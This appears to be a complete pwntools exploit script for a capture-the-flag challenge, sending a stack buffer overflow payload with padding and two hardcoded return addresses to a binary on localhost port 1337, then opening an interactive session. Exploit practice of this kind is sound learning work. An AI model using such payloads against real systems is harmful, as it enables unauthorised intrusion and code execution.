from pwn import *

#p = process("./chall")
p = remote("localhost", 1337)

payload = b"A" * 32
payload += b"B" * 8
payload += b"C" * 8
payload += b"D" * 8
payload += p64(0x40101a)
payload += p64(0x401150)

p.sendline(payload)

p.interactive()
